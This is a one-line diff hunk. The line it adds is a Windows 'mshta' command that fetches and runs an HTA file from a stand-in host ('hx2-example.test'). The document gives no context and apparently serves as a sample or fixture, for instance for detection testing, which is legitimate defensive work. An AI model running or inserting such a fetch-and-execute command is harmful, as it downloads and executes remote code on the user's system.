@@ -1,0 +1,1 @@
+mshta http://hx2-example.test/y.hta
